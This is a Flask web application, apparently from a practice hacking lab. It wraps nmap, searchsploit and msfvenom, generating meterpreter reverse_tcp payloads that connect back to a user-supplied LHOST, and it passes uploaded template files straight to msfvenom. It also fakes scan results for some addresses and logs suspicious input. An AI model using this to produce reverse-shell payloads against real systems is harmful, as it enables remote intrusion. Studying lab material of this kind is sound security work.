```python
import datetime
import os
import random
import re
import subprocess
import tempfile
import time
from flask import Flask, render_template, request
from hashlib import md5
from werkzeug.utils import secure_filename


regex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
OS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'}

app = Flask(__name__)


@app.route('/', methods=['GET','POST'])
def index():
    if request.method == 'GET' or not 'action' in request.form:
        return render_template('index.html')
    elif request.form['action'] == 'scan':
        return scan(request.form['ip'])
    elif request.form['action'] == 'generate':
        return venom(request)
    elif request.form['action'] == 'searchsploit':
        return searchsploit(request.form['search'], request.remote_addr)
    print("no valid action")
    return request.form


def scan(ip):
    if regex_ip.match(ip):
        if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
            stime = random.randint(200,400)/100
            time.sleep(stime)
            result = f"""Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")} UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
        else:
            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))
    return render_template('index.html', scanerror="invalid ip")


def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")


def venom(request):
    errors = []
    file = None
    if not 'lhost' in request.form:
        errors.append('lhost missing')
    else:
        lhost = request.form['lhost']
        if not regex_ip.match(lhost):
            errors.append('invalid lhost ip')
    if not 'os' in request.form:
        errors.append('os missing')
    else:
        tar_os = request.form['os']
        if tar_os not in ['windows', 'linux', 'android']:
            errors.append(f'invalid os: {tar_os}')
    if 'template' in request.files and request.files['template'].filename != '':
        file = request.files['template']
        if not ('.' in file.filename and file.filename.split('.')[-1] == OS_2_EXT[tar_os]):
            errors.append(f'{tar_os} requires a {OS_2_EXT[tar_os]} ext template file')
        else:
            template_name = secure_filename(file.filename)
            template_ext = file.filename.split('.')[-1]
            template_file = tempfile.NamedTemporaryFile('wb', suffix='.'+template_ext)
            file.save(template_file.name)
    else:
        template_name = "None"

    if errors:
        return render_template('index.html', payloaderror='<br/>\n'.join(errors))

    payload = f'{tar_os}/meterpreter/reverse_tcp'
    outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + '.' + OS_2_EXT[tar_os]
    outfilepath = os.path.join(app.root_path, 'static', 'payloads', outfilename)

    try:
        if file:
            print(f'msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444')
            result = subprocess.check_output(['msfvenom', '-x', template_file.name, '-p',
                payload, f'LHOST={lhost}', 'LPORT=4444',
                '-o', outfilepath])
            template_file.close()
        else:
            result = subprocess.check_output(['msfvenom', '-p', payload,
                f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath])
    except subprocess.CalledProcessError:
        return render_template('index.html', payloaderror="Something went wrong")

    
    return render_template('index.html', payload=payload, lhost=lhost,
            lport=4444, template=template_name, fn=outfilename)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
